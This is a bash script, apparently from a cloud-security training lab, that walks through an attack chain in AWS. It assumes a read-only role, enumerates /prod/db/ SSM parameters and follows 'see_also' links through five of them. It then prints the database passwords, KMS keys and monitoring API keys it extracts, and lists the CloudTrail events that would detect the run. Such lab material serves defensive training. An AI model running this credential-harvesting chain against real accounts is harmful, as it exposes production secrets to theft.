#!/usr/bin/env bash
#
# abuse.sh — Simulate attacker abuse of Scenario 20 (SSM Parameter Cross-Reference Chain)
#
# This script walks through the attack chain step by step with colored output.
# The attacker assumes the discovery role, discovers the /prod/db/* parameter
# hierarchy, and follows the see_also breadcrumb chain through all 5 parameters.
#
# Usage:
#   chmod +x abuse.sh
#   ./abuse.sh
#
set -euo pipefail

# ---------------------------------------------------------------
# Colors and helpers
# ---------------------------------------------------------------
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
CYAN='\033[0;36m'
NC='\033[0m' # No Color

step() { echo -e "\n${CYAN}[STEP $1]${NC} $2"; }
info() { echo -e "  ${GREEN}[+]${NC} $1"; }
warn() { echo -e "  ${YELLOW}[!]${NC} $1"; }
attack() { echo -e "  ${RED}[ATTACK]${NC} $1"; }

echo -e "${RED}"
echo "============================================="
echo "  SCENARIO 20 — ABUSE CHAIN"
echo "  SSM Parameter Cross-Reference Chain"
echo "============================================="
echo -e "${NC}"

# ---------------------------------------------------------------
step "1" "Resolving account identity"
# ---------------------------------------------------------------
ACCOUNT_ID=$(aws sts get-caller-identity --query "Account" --output text)
CALLER_ARN=$(aws sts get-caller-identity --query "Arn" --output text)
info "Account ID: ${ACCOUNT_ID}"
info "Caller ARN: ${CALLER_ARN}"

# ---------------------------------------------------------------
step "2" "Assuming discovery role: infra-params-readonly-role"
# ---------------------------------------------------------------
ROLE_ARN="arn:aws:iam::${ACCOUNT_ID}:role/infra-params-readonly-role"
attack "sts:AssumeRole → ${ROLE_ARN}"

CREDS=$(aws sts assume-role \
  --role-arn "${ROLE_ARN}" \
  --role-session-name "recon-infra-session" \
  --query "Credentials" \
  --output json)

export AWS_ACCESS_KEY_ID=$(echo "${CREDS}" | jq -r .AccessKeyId)
export AWS_SECRET_ACCESS_KEY=$(echo "${CREDS}" | jq -r .SecretAccessKey)
export AWS_SESSION_TOKEN=$(echo "${CREDS}" | jq -r .SessionToken)
info "Role assumed successfully"

# ---------------------------------------------------------------
step "3" "Discovering SSM parameters (ssm:DescribeParameters)"
# ---------------------------------------------------------------
attack "ssm:DescribeParameters (filter: /prod/db/)"
echo ""
echo -e "${YELLOW}--- Parameters under /prod/db/* ---${NC}"
aws ssm describe-parameters \
  --parameter-filters "Key=Name,Option=BeginsWith,Values=/prod/db/" \
  --query "Parameters[].{Name:Name,Description:Description,LastModified:LastModifiedDate}" \
  --output table
echo ""

# ---------------------------------------------------------------
step "4" "Chain link 1: Reading /prod/db/primary"
# ---------------------------------------------------------------
attack "ssm:GetParameter → /prod/db/primary"
PRIMARY=$(aws ssm get-parameter \
  --name "/prod/db/primary" \
  --query "Parameter.Value" \
  --output text)
echo ""
echo -e "${YELLOW}--- /prod/db/primary ---${NC}"
echo "${PRIMARY}" | jq '.'
NEXT=$(echo "${PRIMARY}" | jq -r '.see_also')
info "Breadcrumb found: see_also → ${NEXT}"

# ---------------------------------------------------------------
step "5" "Chain link 2: Reading /prod/db/replica"
# ---------------------------------------------------------------
attack "ssm:GetParameter → ${NEXT}"
REPLICA=$(aws ssm get-parameter \
  --name "${NEXT}" \
  --query "Parameter.Value" \
  --output text)
echo ""
echo -e "${YELLOW}--- /prod/db/replica ---${NC}"
echo "${REPLICA}" | jq '.'
NEXT=$(echo "${REPLICA}" | jq -r '.see_also')
info "Breadcrumb found: see_also → ${NEXT}"

# ---------------------------------------------------------------
step "6" "Chain link 3: Reading /prod/db/backup-config"
# ---------------------------------------------------------------
attack "ssm:GetParameter → ${NEXT}"
BACKUP=$(aws ssm get-parameter \
  --name "${NEXT}" \
  --query "Parameter.Value" \
  --output text)
echo ""
echo -e "${YELLOW}--- /prod/db/backup-config ---${NC}"
echo "${BACKUP}" | jq '.'
NEXT=$(echo "${BACKUP}" | jq -r '.see_also')
info "Breadcrumb found: see_also → ${NEXT}"

# ---------------------------------------------------------------
step "7" "Chain link 4: Reading /prod/db/encryption-config"
# ---------------------------------------------------------------
attack "ssm:GetParameter → ${NEXT}"
ENCRYPTION=$(aws ssm get-parameter \
  --name "${NEXT}" \
  --query "Parameter.Value" \
  --output text)
echo ""
echo -e "${YELLOW}--- /prod/db/encryption-config ---${NC}"
echo "${ENCRYPTION}" | jq '.'
NEXT=$(echo "${ENCRYPTION}" | jq -r '.see_also')
info "Breadcrumb found: see_also → ${NEXT}"

# ---------------------------------------------------------------
step "8" "Chain link 5: Reading /prod/db/monitoring (end of chain)"
# ---------------------------------------------------------------
attack "ssm:GetParameter → ${NEXT}"
MONITORING=$(aws ssm get-parameter \
  --name "${NEXT}" \
  --query "Parameter.Value" \
  --output text)
echo ""
echo -e "${YELLOW}--- /prod/db/monitoring ---${NC}"
echo "${MONITORING}" | jq '.'
info "End of chain — no see_also field"

# ---------------------------------------------------------------
step "9" "Summary of extracted credentials"
# ---------------------------------------------------------------
echo ""
warn "Credentials extracted from the chain:"
echo ""
echo "  /prod/db/primary:"
echo "    host: $(echo "${PRIMARY}" | jq -r '.host')"
echo "    user: $(echo "${PRIMARY}" | jq -r '.username')"
echo "    pass: $(echo "${PRIMARY}" | jq -r '.password')"
echo ""
echo "  /prod/db/replica:"
echo "    host: $(echo "${REPLICA}" | jq -r '.host')"
echo "    user: $(echo "${REPLICA}" | jq -r '.username')"
echo "    pass: $(echo "${REPLICA}" | jq -r '.password')"
echo ""
echo "  /prod/db/backup-config:"
echo "    bucket: $(echo "${BACKUP}" | jq -r '.backup_bucket')"
echo "    kms_key: $(echo "${BACKUP}" | jq -r '.backup_encryption_key')"
echo ""
echo "  /prod/db/encryption-config:"
echo "    kms_key: $(echo "${ENCRYPTION}" | jq -r '.kms_key_arn')"
echo "    admin_role: $(echo "${ENCRYPTION}" | jq -r '.key_administrator_role')"
echo ""
echo "  /prod/db/monitoring:"
echo "    datadog_api: $(echo "${MONITORING}" | jq -r '.datadog_api_key')"
echo "    pagerduty: $(echo "${MONITORING}" | jq -r '.pagerduty_integration_key')"
echo "    webhook: $(echo "${MONITORING}" | jq -r '.alert_webhook_url')"

# ---------------------------------------------------------------
# Cleanup
# ---------------------------------------------------------------
echo ""
step "10" "Cleaning up session"
unset AWS_ACCESS_KEY_ID AWS_SECRET_ACCESS_KEY AWS_SESSION_TOKEN
info "Session credentials cleared"

echo ""
echo -e "${GREEN}=============================================${NC}"
echo -e "${GREEN}  Abuse chain complete — full chain traversed${NC}"
echo -e "${GREEN}=============================================${NC}"
echo ""
echo -e "${YELLOW}Detection signals generated:${NC}"
echo "  • CloudTrail: AssumeRole on infra-params-readonly-role"
echo "  • CloudTrail: DescribeParameters (filter /prod/db/)"
echo "  • CloudTrail: GetParameter on /prod/db/primary"
echo "  • CloudTrail: GetParameter on /prod/db/replica"
echo "  • CloudTrail: GetParameter on /prod/db/backup-config"
echo "  • CloudTrail: GetParameter on /prod/db/encryption-config"
echo "  • CloudTrail: GetParameter on /prod/db/monitoring"
echo ""
echo -e "${YELLOW}Total CloudTrail events: 7${NC}"
echo ""
